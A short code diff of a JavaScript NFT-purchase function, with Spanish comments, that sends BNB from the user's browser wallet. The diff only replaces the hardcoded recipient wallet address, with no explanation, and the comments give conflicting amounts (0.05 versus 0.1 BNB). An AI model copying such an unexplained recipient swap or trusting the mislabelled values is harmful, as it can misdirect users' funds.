@@ -17,7 +17,7 @@ async function buyNFTs() {
 
         // Enviar la transacción de 0.05 BNB a la dirección especificada
         const transactionParameters = {
-            to: '0xBF92611C71f906FDD5ae1F61d93Ab65ED18784f5',  // Dirección de destino
+            to: '0xAfb462a5E928C80bC9d09Dae1F1bFD906976d859',  // Dirección de destino
             from: window.ethereum.selectedAddress,
             value: '0x1312d00f4e10000',  // 0.1 BNB en hexadecimal
             gas: '0xc350',  // 50000 en hexadecimal
